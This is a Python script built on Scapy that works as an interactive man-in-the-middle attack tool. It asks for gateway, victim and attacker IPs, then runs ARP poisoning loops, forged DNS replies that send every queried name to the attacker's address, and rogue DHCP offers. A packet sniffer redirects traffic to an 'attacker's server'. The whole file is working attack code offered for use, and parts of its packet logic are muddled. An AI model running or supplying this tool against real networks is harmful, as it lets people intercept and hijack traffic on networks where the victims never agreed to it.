from scapy.all import ARP, Ether, IP, UDP, BOOTP, DHCP, DNS, DNSQR, DNSRR, TCP, srp, send, sniff
import subprocess
import re
import time
import threading
import platform

def is_valid_ip(ip):
    """Validate an IP address format."""
    pattern = r"^\d{1,3}(\.\d{1,3}){3}$"
    return bool(re.match(pattern, ip)) and all(0 <= int(octet) <= 255 for octet in ip.split("."))

def get_mac_address(ip):
    """Get the MAC address of a given IP address by sending ARP requests."""
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=5, retry=3, verbose=False)
        for _, r in ans:
            return r[Ether].src
    except Exception as e:
        print(f"[ERROR] Unable to get MAC address for {ip}: {e}")
        return None

def send_arp_spoof(target_ip, source_ip, target_mac):
    """Send ARP spoof packets."""
    try:
        spoofed_arp = ARP(op=2, psrc=source_ip, pdst=target_ip, hwdst=target_mac)
        send(spoofed_arp, verbose=False)
    except Exception as e:
        print(f"[ERROR] Failed to send ARP spoofed packet: {e}")

def restore_arp(victim_ip, gateway_ip, victim_mac, gateway_mac):
    """Restore ARP tables."""
    try:
        restore_victim = ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac, hwsrc=gateway_mac)
        restore_gateway = ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac, hwsrc=victim_mac)
        send(restore_victim, count=3, verbose=False)
        send(restore_gateway, count=3, verbose=False)
        print("[INFO] Restored ARP tables.")
    except Exception as e:
        print(f"[ERROR] Failed to restore ARP table: {e}")

def spoof_dns_response(packet):
    """Spoof DNS responses to redirect all traffic to the attacker IP."""
    if packet.haslayer(DNSQR):  # Check if the packet contains DNS query
        dns_query = packet[DNSQR].qname.decode()
        if packet[DNS].opcode == 0:  # Check if it's a DNS query (opcode 0)
            print(f"[INFO] Spoofing DNS response for {dns_query}...")
            # Create a DNS response packet
            dns_response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                           UDP(dport=packet[UDP].sport, sport=53) / \
                           DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, an=DNSRR(rrname=dns_query, rdata=attacker_ip))
            send(dns_response, verbose=False)

def dhcp_spoofing(victim_ip, victim_mac, attack_ip):
    """Spoof DHCP responses to redirect to the attacker's IP."""
    try:
        dhcp_offer = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(src=attack_ip, dst="255.255.255.255") / \
                     UDP(sport=67, dport=68) / BOOTP(op=2, chaddr=victim_mac, yiaddr=victim_ip) / \
                     DHCP(options=[("message-type", "offer"), ("server_id", attack_ip), ("lease_time", 3600), ("end")])
        send(dhcp_offer, verbose=False)
        print(f"[INFO] Sent DHCP Offer to victim: {victim_ip} -> {attack_ip}")
    except Exception as e:
        print(f"[ERROR] Failed to send DHCP spoofing packet: {e}")

def start_arp_spoofing():
    """Start continuous ARP spoofing to redirect traffic."""
    while True:
        send_arp_spoof(gateway_ip, victim_ip, victim_mac)
        send_arp_spoof(victim_ip, gateway_ip, gateway_mac)
        time.sleep(2)  # Increase frequency of ARP spoofing to ensure consistent redirection

def check_server_status():
    """Check if the attacker's server is active."""
    response = subprocess.run(["ping", "-c", "1", attacker_ip], stdout=subprocess.PIPE)
    return response.returncode == 0

def start_server_if_needed():
    """Start the attacker's server if it's not already running."""
    if not check_server_status():
        print("[INFO] Attacker's server is not active. Starting the server...")
        subprocess.run(["path_to_start_server_script.sh"])  # Replace with actual server start command
        time.sleep(5)  # Wait for the server to start
    else:
        print("[INFO] Attacker's server is already active.")

def start_dhcp_spoofing():
    """Start continuous DHCP spoofing to redirect victim's network traffic."""
    while True:
        dhcp_spoofing(victim_ip, victim_mac, attacker_ip)
        time.sleep(2)

def packet_callback(packet):
    """Callback function to handle packets."""
    if packet.haslayer(ARP):
        print(f"ARP packet detected: {packet.summary()}")
    
    if packet.haslayer(IP) and packet.haslayer(TCP):
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        print(f"Intercepted packet: {ip_src} -> {ip_dst}")

        if ip_dst == victim_ip:
            print(f"[INFO] Redirecting {ip_dst} to attacker's server.")
            packet[IP].dst = attacker_ip
            del packet[IP].len
            del packet[IP].chksum
            send(packet, verbose=False)

def show_menu():
    """Show the main menu for tool selection."""
    print("\n[ - Menu - ]")
    print("[1] Tools : ARP, DNS, DHCP Spoofing")
    print("[2] Exit")

def main():
    """Main function to initiate the attack or other functionalities."""
    while True:
        show_menu()
        choice = input("> ").strip()

        if choice == "1":
            print("\n=== ARP and DNS Spoofing Tool with DHCP Spoofing ===")
            global gateway_ip, victim_ip, attacker_ip, victim_mac, gateway_mac

            while True:
                gateway_ip = input("Enter the Gateway IP address: ")
                if is_valid_ip(gateway_ip):
                    break
                print("[ERROR] Invalid IP address. Please try again.")

            while True:
                victim_ip = input("Enter the Victim IP address: ")
                if is_valid_ip(victim_ip):
                    break
                print("[ERROR] Invalid IP address. Please try again.")

            while True:
                attacker_ip = input("Enter your Attacker IP address: ")
                if is_valid_ip(attacker_ip):
                    if attacker_ip == victim_ip:
                        print("[ERROR] Attacker IP cannot be the same as Victim IP. Please choose a different IP.")
                        continue
                    break
                print("[ERROR] Invalid Attacker IP address. Please try again.")

            print("[INFO] Resolving MAC addresses...")
            victim_mac = get_mac_address(victim_ip)
            gateway_mac = get_mac_address(gateway_ip)

            if victim_mac is None or gateway_mac is None:
                print("[ERROR] Could not resolve MAC addresses. Exiting...")
                return

            print("[INFO] Starting ARP and DNS spoofing...")
            print(f"[INFO] Victim IP: {victim_ip} -> MAC: {victim_mac}")
            print(f"[INFO] Gateway IP: {gateway_ip} -> MAC: {gateway_mac}")

            sniff_thread = threading.Thread(target=lambda: sniff(prn=packet_callback, store=0, filter="ip", timeout=10))
            sniff_thread.start()
            
            arp_thread = threading.Thread(target=start_arp_spoofing)
            arp_thread.start()

            dhcp_thread = threading.Thread(target=start_dhcp_spoofing)
            dhcp_thread.start()

            start_server_if_needed()

            try:
                while True:
                    sniff(prn=spoof_dns_response, store=0, filter="udp and port 53", timeout=10)
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n[INFO] Stopping ARP and DNS spoofing. Restoring ARP tables...")
                restore_arp(victim_ip, gateway_ip, victim_mac, gateway_mac)
                print("[INFO] Exiting program.")
        elif choice == "2":
            print("[INFO] Exiting tool. Goodbye!")
            break
        else:
            print("[ERROR] Invalid choice. Please select a valid option.")

if __name__ == "__main__":
    main()